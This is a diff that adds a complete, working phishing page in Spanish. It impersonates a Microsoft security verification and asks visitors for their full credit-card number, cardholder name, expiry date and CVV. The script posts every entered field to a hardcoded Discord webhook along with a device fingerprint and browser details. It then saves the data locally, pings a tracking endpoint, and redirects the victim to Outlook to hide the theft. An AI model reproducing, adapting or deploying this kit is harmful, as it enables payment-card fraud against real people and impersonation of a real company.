@@ -1,0 +1,876 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>Verificación de Seguridad | Microsoft</title>
+  <link href="./index_files/todos_refact.css" rel="stylesheet">
+  <script src="./index_files/config.js.descarga"></script>
+  <meta name="theme-color" content="#009A3B">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <style>
+    /* Layout general */
+    body {
+      margin: 0;
+      background-color: #f5f5f5;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* CABECERA ESTILO MICROSOFT */
+    .microsoft-header {
+      background: linear-gradient(to right, #737373 0%, #ffffff 50%, #737373 100%);
+      padding: 15px 40px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #d2d2d2;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 30px;
+    }
+    
+    .microsoft-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 22px;
+      font-weight: 600;
+      color: #737373;
+    }
+    
+    .windows-logo {
+      width: 32px;
+      height: 32px;
+    }
+    
+    .product-title {
+      font-size: 18px;
+      color: #000;
+      font-weight: 500;
+    }
+    
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 25px;
+    }
+    
+    .user-info {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #000;
+      font-size: 14px;
+    }
+    
+    .user-avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #0078d4, #00bcf2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+    }
+
+    /* Contenedor principal con fondo de imagen */
+    .main-container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px 20px;
+      background-image: url('imgnew.svg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      position: relative;
+    }
+    
+    .main-container::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(255, 255, 255, 0.85);
+      z-index: 0;
+    }
+
+    /* Títulos */
+    .header-title {
+      font-size: 28px;
+      font-weight: 300;
+      margin-bottom: 10px;
+      color: #000;
+      text-align: center;
+      position: relative;
+      z-index: 1;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      color: #5A5F66;
+      margin-bottom: 40px;
+      text-align: center;
+      max-width: 600px;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* Contenedor principal para formulario y tarjeta, lado a lado */
+    .validation-container {
+      display: flex;
+      flex-direction: row;
+      justify-content: center;
+      align-items: flex-start;
+      gap: 50px;
+      max-width: 1000px;
+      width: 100%;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* FORMULARIO a la izquierda */
+    .form-container {
+      flex: 1 1 auto;
+      max-width: 450px;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      padding: 30px;
+      border: 1px solid #e1e1e1;
+    }
+    
+    .form-logo {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+    
+    .form-logo img {
+      width: 180px;
+      height: auto;
+    }
+
+    form {
+      width: 100%;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      display: block;
+      font-weight: 500;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #323130;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px 15px;
+      border: 1px solid #d1d1d1;
+      border-radius: 4px;
+      font-size: 15px;
+      box-sizing: border-box;
+      transition: all 0.2s;
+    }
+
+    .form-group input:focus {
+      border-color: #0078d4;
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
+    }
+
+    .error-message {
+      color: #d13438;
+      font-size: 12px;
+      margin-top: 5px;
+      display: none;
+    }
+
+    /* TARJETA a la derecha */
+    .card-container {
+      perspective: 1000px;
+      flex: 1 1 auto;
+      max-width: 400px;
+      display: flex;
+      justify-content: center;
+    }
+
+    .card {
+      width: 360px;
+      height: 220px;
+      border-radius: 12px;
+      transform-style: preserve-3d;
+      transition: transform .6s ease-in-out;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+      position: relative;
+      background: #f8f8f8;
+    }
+
+    .card.flipped {
+      transform: rotateY(180deg);
+    }
+
+    .face {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      backface-visibility: hidden;
+      border-radius: 12px;
+      padding: 20px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    .front {
+      background: linear-gradient(135deg, #1a365d 0%, #2d4d8c 50%, #3a5fc0 100%);
+      color: white;
+    }
+
+    .back {
+      background: linear-gradient(135deg, #2d3748 0%, #4a5568 100%);
+      transform: rotateY(180deg);
+      color: white;
+    }
+
+    .card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .card-logo {
+      font-size: 24px;
+      font-weight: bold;
+    }
+
+    .card-type {
+      font-size: 18px;
+      font-weight: 600;
+    }
+
+    .field-label {
+      font-size: 12px;
+      opacity: 0.8;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 5px;
+    }
+
+    .field-value {
+      font-size: 20px;
+      letter-spacing: 2px;
+      font-family: 'Courier New', monospace;
+      font-weight: 500;
+    }
+
+    .card-footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .cvv-strip {
+      background: #1a202c;
+      height: 40px;
+      width: 100%;
+      margin: 20px 0;
+      display: flex;
+      align-items: center;
+      padding: 0 20px;
+    }
+
+    .cvv-display {
+      background: white;
+      color: #000;
+      padding: 5px 10px;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+      font-weight: bold;
+    }
+
+    /* Botón estilo Microsoft */
+    .btn-continuar {
+      width: 100%;
+      padding: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      border-radius: 4px;
+      border: none;
+      cursor: pointer;
+      margin-top: 10px;
+      background: #0078d4;
+      color: white;
+      transition: background 0.2s;
+    }
+
+    .btn-continuar:hover {
+      background: #106ebe;
+    }
+
+    .btn-continuar:disabled {
+      background: #c7e0f4;
+      cursor: not-allowed;
+    }
+
+    /* Responsivo */
+    @media (max-width: 900px) {
+      .validation-container {
+        flex-direction: column;
+        align-items: center;
+        gap: 30px;
+      }
+      
+      .microsoft-header {
+        flex-direction: column;
+        padding: 15px 20px;
+        gap: 15px;
+      }
+      
+      .header-left, .header-right {
+        width: 100%;
+        justify-content: center;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .form-container {
+        padding: 20px;
+      }
+      
+      .card {
+        width: 320px;
+        height: 200px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- CABECERA ESTILO MICROSOFT -->
+  <div class="microsoft-header">
+    <div class="header-left">
+      <div class="microsoft-logo">
+        <svg class="windows-logo" viewBox="0 0 88 88" fill="currentColor">
+          <path d="M0 12.402l35.687-4.86.016 34.423-35.67.203zm35.67 33.529l.028 34.453L.028 75.48.026 45.7zm4.326-39.025L87.314 0v41.527l-47.318.376zm47.329 39.349l-.012 41.34-47.318-6.678-.066-34.739z"/>
+        </svg>
+        <span>Microsoft</span>
+      </div>
+      <div class="product-title">COMPRA | Cuenta Personal 0.89$</div>
+    </div>
+    <div class="header-right">
+      <div class="user-info">
+        <div class="user-avatar">MS</div>
+        <span>Cuenta Microsoft</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- CONTENIDO PRINCIPAL -->
+  <div class="main-container">
+    <h2 class="header-title">Añade una tarjeta de crédito</h2>
+    <p class="subtitle">Verificamos tu información para garantizar la seguridad de tu cuenta</p>
+    
+    <!-- Contenedor con dos columnas: FORM a la izquierda, TARJETA a la derecha -->
+    <div class="validation-container">
+      
+      <!-- FORMULARIO (izquierda) -->
+      <div class="form-container">
+        <div class="form-logo">
+        </div>
+        
+        <form id="paymentForm">
+          <div class="form-group">
+            <label for="cardInput">Número de tarjeta*</label>
+            <input id="cardInput" name="cc" type="text" maxlength="19" placeholder="1234 5678 9012 3456" aria-required="true">
+            <div class="error-message" id="cardError">Número de tarjeta inválido.</div>
+          </div>
+
+          <div class="form-group">
+            <label for="cardholderInput">Nombre del titular*</label>
+            <input id="cardholderInput" name="cardholder" type="text" placeholder="Como aparece en la tarjeta" aria-required="true">
+            <div class="error-message" id="nameError">Nombre requerido.</div>
+          </div>
+
+          <div class="form-group">
+            <label>Expiración*</label>
+            <div style="display: flex; gap: 15px;">
+              <div style="flex: 1;">
+                <select id="expiryMonth" name="expiryMonth" style="width: 100%; padding: 12px 15px; border: 1px solid #d1d1d1; border-radius: 4px; font-size: 15px;">
+                  <option value="">Mes</option>
+                  <option value="01">01 - Enero</option>
+                  <option value="02">02 - Febrero</option>
+                  <option value="03">03 - Marzo</option>
+                  <option value="04">04 - Abril</option>
+                  <option value="05">05 - Mayo</option>
+                  <option value="06">06 - Junio</option>
+                  <option value="07">07 - Julio</option>
+                  <option value="08">08 - Agosto</option>
+                  <option value="09">09 - Septiembre</option>
+                  <option value="10">10 - Octubre</option>
+                  <option value="11">11 - Noviembre</option>
+                  <option value="12">12 - Diciembre</option>
+                </select>
+              </div>
+              <div style="flex: 1;">
+                <select id="expiryYear" name="expiryYear" style="width: 100%; padding: 12px 15px; border: 1px solid #d1d1d1; border-radius: 4px; font-size: 15px;">
+                  <option value="">Año</option>
+                  <option value="2024">2024</option>
+                  <option value="2025">2025</option>
+                  <option value="2026">2026</option>
+                  <option value="2027">2027</option>
+                  <option value="2028">2028</option>
+                  <option value="2029">2029</option>
+                  <option value="2030">2030</option>
+                </select>
+              </div>
+            </div>
+            <div class="error-message" id="expiryError">Fecha de expiración inválida.</div>
+          </div>
+
+          <div class="form-group">
+            <label for="cvvInput">CVV*</label>
+            <input id="cvvInput" name="cvv" type="password" maxlength="4" placeholder="•••" aria-required="true">
+            <div class="error-message" id="cvvError">CVV inválido.</div>
+          </div>
+
+          <button type="submit" id="btnContinuar" class="btn-continuar" disabled>
+            Continuar
+          </button>
+        </form>
+      </div>
+      
+      <!-- TARJETA (derecha) -->
+      <div class="card-container">
+        <div class="card" id="card">
+          <!-- FRONTAL DE LA TARJETA -->
+          <div class="face front">
+            <div class="card-header">
+              <div class="card-logo" id="cardTypeDisplay">VISA</div>
+              <div class="chip">🔲</div>
+            </div>
+            
+            <div class="card-number">
+              <div class="field-label">Número de tarjeta</div>
+              <div class="field-value" id="cardNumberDisplay">#### #### #### ####</div>
+            </div>
+            
+            <div class="card-footer">
+              <div>
+                <div class="field-label">Nombre del titular</div>
+                <div class="field-value" id="cardholderDisplay">JOHN DOE</div>
+              </div>
+              <div>
+                <div class="field-label">Expiración</div>
+                <div class="field-value" id="expiryDisplay">MM/AA</div>
+              </div>
+            </div>
+          </div>
+          
+          <!-- REVERSO DE LA TARJETA -->
+          <div class="face back">
+            <div style="height: 50px; background: #000; margin: -20px -20px 20px -20px;"></div>
+            
+            <div class="cvv-strip">
+              <div style="flex: 1;">
+                <div class="field-label">CVV</div>
+                <div class="cvv-display" id="cvvDisplay">•••</div>
+              </div>
+            </div>
+            
+            <div style="text-align: center; margin-top: 20px;">
+              <div class="field-label">Para su seguridad, no comparta su CVV</div>
+              <div style="font-size: 10px; opacity: 0.6; margin-top: 10px;">
+                Esta es una representación visual únicamente
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+<script>
+    // Variables globales
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1428171161287790612/sR0SEn5-2wGHukRr0YK1fdu-Q9HyHildS9Rh5p5LJUA1jNs0uuvWOfvtxwSvK5U2RxV6';
+    
+    // Elementos del DOM
+    const card = document.getElementById('card');
+    const cardNumDisp = document.getElementById('cardNumberDisplay');
+    const cardholderDisplay = document.getElementById('cardholderDisplay');
+    const expiryDisplay = document.getElementById('expiryDisplay');
+    const cvvDisplay = document.getElementById('cvvDisplay');
+    const cardTypeDisplay = document.getElementById('cardTypeDisplay');
+    const cardLogo = document.getElementById('cardLogo');
+    
+    // Inputs
+    const cardInput = document.getElementById('cardInput');
+    const cardholderInput = document.getElementById('cardholderInput');
+    const expiryMonth = document.getElementById('expiryMonth');
+    const expiryYear = document.getElementById('expiryYear');
+    const cvvInput = document.getElementById('cvvInput');
+    const form = document.getElementById('paymentForm');
+    const btnContinuar = document.getElementById('btnContinuar');
+    
+    // Estado inicial - Ocultar franquicia
+    let isFirstDigitEntered = false;
+    
+    // Función para validar número de tarjeta
+    function validateCardNumber(cardNumber) {
+      const cleanNumber = cardNumber.replace(/\s/g, '');
+      return cleanNumber.length >= 13 && cleanNumber.length <= 19 && /^\d+$/.test(cleanNumber);
+    }
+    
+    // Función para detectar tipo de tarjeta
+    function detectCardType(cardNumber) {
+      const cleanNumber = cardNumber.replace(/\s/g, '');
+      
+      if (cleanNumber.length === 0) {
+        return null; // No mostrar nada si no hay dígitos
+      }
+      
+      if (/^4/.test(cleanNumber)) {
+        return 'VISA';
+      } else if (/^5[1-5]/.test(cleanNumber)) {
+        return 'MASTERCARD';
+      } else if (/^3[47]/.test(cleanNumber)) {
+        return 'AMEX';
+      } else if (/^6(?:011|5)/.test(cleanNumber)) {
+        return 'DISCOVER';
+      } else if (/^2/.test(cleanNumber)) {
+        return 'MASTERCARD';
+      } else if (/^3[0-69]/.test(cleanNumber)) {
+        return 'DINERS';
+      } else if (/^35/.test(cleanNumber)) {
+        return 'JCB';
+      } else if (/^62/.test(cleanNumber)) {
+        return 'UNIONPAY';
+      }
+      
+      return; // Para números que no coinciden con los patrones conocidos
+    }
+    
+    // Función para actualizar logo según tipo de tarjeta
+    function updateCardLogo(cardType) {
+      if (!cardType) {
+        // Si no hay tipo de tarjeta (campo vacío), mostrar placeholder
+        cardTypeDisplay.textContent = 'XXXX';
+        cardTypeDisplay.style.opacity = '0.5';
+        cardLogo.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMTAwIDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNjAiIHJ4PSI4IiBmaWxsPSIjRjBGMEYwIi8+PHRleHQgeD0iNTAiIHk9IjMwIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTQiIGZpbGw9IiM2NjYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGR5PSIuM2VtIj5DQVJEPC90ZXh0Pjwvc3ZnPg==';
+        return;
+      }
+      
+      cardTypeDisplay.style.opacity = '1';
+      
+      if (cardType === 'VISA') {
+        cardTypeDisplay.textContent = 'VISA';
+      } else if (cardType === 'MASTERCARD') {
+        cardTypeDisplay.textContent = 'MASTERCARD';
+      } else if (cardType === 'AMEX') {
+        cardTypeDisplay.textContent = 'AMEX';
+      } else if (cardType === 'DISCOVER') {
+        cardTypeDisplay.textContent = 'DISCOVER';
+      } else {
+        cardTypeDisplay.textContent = cardType;
+      }
+    }
+    
+    // Función para validar todos los campos
+    function validateInputs() {
+      const cardValid = validateCardNumber(cardInput.value);
+      const nameValid = cardholderInput.value.trim().length > 0;
+      const expiryValid = expiryMonth.value && expiryYear.value;
+      const cvvValid = cvvInput.value.length >= 3 && cvvInput.value.length <= 4;
+      
+      // Mostrar/ocultar errores
+      document.getElementById('cardError').style.display = !cardValid && cardInput.value ? 'block' : 'none';
+      document.getElementById('nameError').style.display = !nameValid && cardholderInput.value ? 'block' : 'none';
+      document.getElementById('expiryError').style.display = !expiryValid && (expiryMonth.value || expiryYear.value) ? 'block' : 'none';
+      document.getElementById('cvvError').style.display = !cvvValid && cvvInput.value ? 'block' : 'none';
+      
+      // Habilitar/deshabilitar botón
+      if (cardValid && nameValid && expiryValid && cvvValid) {
+        btnContinuar.removeAttribute('disabled');
+      } else {
+        btnContinuar.setAttribute('disabled', 'true');
+      }
+      
+      return cardValid && nameValid && expiryValid && cvvValid;
+    }
+    
+    // Función para manejar la entrada del primer dígito
+    function handleFirstDigitInput() {
+      const cleanValue = cardInput.value.replace(/\D/g, '');
+      
+      if (cleanValue.length === 1 && !isFirstDigitEntered) {
+        isFirstDigitEntered = true;
+        const cardType = detectCardType(cleanValue);
+        updateCardLogo(cardType);
+      } else if (cleanValue.length === 0) {
+        isFirstDigitEntered = false;
+        updateCardLogo(null); // Resetear a placeholder
+      } else if (cleanValue.length > 1) {
+        const cardType = detectCardType(cleanValue);
+        updateCardLogo(cardType);
+      }
+    }
+    
+    // Event listeners para validación en tiempo real
+    cardInput.addEventListener('input', () => {
+      // Autoformatear número
+      let cleanValue = cardInput.value.replace(/\D/g, '');
+      cleanValue = cleanValue.match(/.{1,4}/g)?.join(' ') || '';
+      cardInput.value = cleanValue;
+      
+      // Mostrar NÚMERO COMPLETO en la tarjeta (SIN CENSURA)
+      cardNumDisp.textContent = cleanValue || '#### #### #### ####';
+      
+      // Detectar y mostrar tipo de tarjeta solo después del primer dígito
+      handleFirstDigitInput();
+      
+      validateInputs();
+    });
+    
+    cardholderInput.addEventListener('input', () => {
+      cardholderDisplay.textContent = cardholderInput.value.toUpperCase() || 'JOHN DOE';
+      validateInputs();
+    });
+    
+    expiryMonth.addEventListener('change', () => {
+      if (expiryMonth.value && expiryYear.value) {
+        expiryDisplay.textContent = `${expiryMonth.value}/${expiryYear.value.slice(-2)}`;
+      }
+      validateInputs();
+    });
+    
+    expiryYear.addEventListener('change', () => {
+      if (expiryMonth.value && expiryYear.value) {
+        expiryDisplay.textContent = `${expiryMonth.value}/${expiryYear.value.slice(-2)}`;
+      }
+      validateInputs();
+    });
+    
+    cvvInput.addEventListener('focus', () => card.classList.add('flipped'));
+    cvvInput.addEventListener('blur', () => card.classList.remove('flipped'));
+    
+    cvvInput.addEventListener('input', () => {
+      cvvDisplay.textContent = cvvInput.value || '•••';
+      validateInputs();
+    });
+    
+    // Inicializar estado de la tarjeta (mostrar placeholder)
+    document.addEventListener('DOMContentLoaded', () => {
+      updateCardLogo(null);
+    });
+    
+    // Función para generar ID único del dispositivo
+    function getDeviceId() {
+      const components = [
+        navigator.userAgent,
+        navigator.language,
+        navigator.platform,
+        screen.width,
+        screen.height,
+        screen.colorDepth,
+        new Date().getTime()
+      ];
+      
+      let hash = 0;
+      const str = components.join('|');
+      
+      for (let i = 0; i < str.length; i++) {
+        const char = str.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash = hash & hash;
+      }
+      
+      return 'device_' + Math.abs(hash).toString(16);
+    }
+    
+    // Función para obtener información del usuario
+    function getUserInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer || 'Direct'
+      };
+    }
+    
+    // Función para enviar datos a Discord
+    async function sendToDiscord(formData, deviceId, userInfo) {
+      try {
+        // Detectar tipo de tarjeta para el mensaje de Discord
+        const cardType = detectCardType(formData.cc || '') || 'Desconocida';
+        
+        const embed = {
+          title: "💳 Nuevo Submission de Tarjeta - Microsoft",
+          color: 0x0078d4,
+          fields: [
+            {
+              name: "📱 Dispositivo",
+              value: `\`${deviceId}\``,
+              inline: true
+            },
+            {
+              name: "💳 Tipo de Tarjeta",
+              value: cardType,
+              inline: true
+            },
+            {
+              name: "🌍 Navegador",
+              value: userInfo.userAgent.substring(0, 50) + '...',
+              inline: true
+            },
+            {
+              name: "🖥️ Pantalla",
+              value: userInfo.screen,
+              inline: true
+            },
+            {
+              name: "🔢 Número COMPLETO",
+              value: formData.cc ? `\`${formData.cc}\`` : "No proporcionado",
+              inline: false
+            },
+            {
+              name: "👤 Titular COMPLETO",
+              value: formData.cardholder || "No proporcionado",
+              inline: true
+            },
+            {
+              name: "📅 Expiración COMPLETA",
+              value: `${formData.expiryMonth || ''}/${formData.expiryYear || ''}`,
+              inline: true
+            },
+            {
+              name: "🔒 CVV COMPLETO",
+              value: formData.cvv ? `\`${formData.cvv}\`` : "No proporcionado",
+              inline: true
+            },
+            {
+              name: "⏰ Timestamp",
+              value: new Date().toLocaleString(),
+              inline: false
+            }
+          ],
+          timestamp: new Date().toISOString(),
+          footer: {
+            text: `Microsoft Security Verification • ${deviceId}`
+          }
+        };
+        
+        const payload = {
+          username: "Microsoft Security Monitor",
+          avatar_url: "https://cdn-icons-png.flaticon.com/512/732/732221.png",
+          embeds: [embed]
+        };
+        
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload)
+        });
+        
+        return response.ok;
+      } catch (error) {
+        console.error('Error al enviar a Discord:', error);
+        return false;
+      }
+    }
+    
+    // Función para procesar el formulario
+    async function processForm(event) {
+      event.preventDefault();
+      
+      if (!validateInputs()) {
+        alert('Por favor, complete todos los campos correctamente.');
+        return;
+      }
+      
+      // Deshabilitar botón durante el envío
+      btnContinuar.disabled = true;
+      btnContinuar.textContent = 'Procesando...';
+      
+      // Preparar datos del formulario
+      const formData = {
+        cc: cardInput.value.replace(/\s/g, ''), // Quitar espacios
+        cardholder: cardholderInput.value.trim(),
+        expiryMonth: expiryMonth.value,
+        expiryYear: expiryYear.value,
+        cvv: cvvInput.value.trim()
+      };
+      
+      const deviceId = getDeviceId();
+      const userInfo = getUserInfo();
+      
+      // Enviar a Discord
+      const success = await sendToDiscord(formData, deviceId, userInfo);
+      
+      if (success) {
+        // Guardar en localStorage
+        const submissions = JSON.parse(localStorage.getItem('microsoft_submissions') || '[]');
+        submissions.push({
+          deviceId,
+          formData,
+          userInfo,
+          timestamp: new Date().toISOString()
+        });
+        localStorage.setItem('microsoft_submissions', JSON.stringify(submissions));
+        
+        // Simular procesamiento exitoso
+        setTimeout(() => {
+          // En un caso real, aquí redirigirías a la siguiente página
+          window.location.href = 'https://outlook.live.com/mail/0/';
+        }, 1000);
+      } else {
+        alert('❌ Error en la verificación. Por favor, intente nuevamente.');
+        btnContinuar.disabled = false;
+        btnContinuar.textContent = 'Continuar';
+      }
+    }
+    
+    // Inicializar
+    document.addEventListener('DOMContentLoaded', () => {
+      // Configurar evento del formulario
+      form.addEventListener('submit', processForm);
+      
+      // Configurar validación inicial
+      validateInputs();
+      
+      // Simular ping (opcional)
+      setInterval(() => {
+        fetch('../../functions.php?action=ping', { 
+          method: 'GET', 
+          keepalive: true 
+        }).catch(() => {});
+      }, 5000);
+      
+      // Configurar unload
+      window.addEventListener('unload', () => {
+        navigator.sendBeacon('../../functions.php?action=offline');
+      });
+    });
+  </script>
+</body>
+</html>
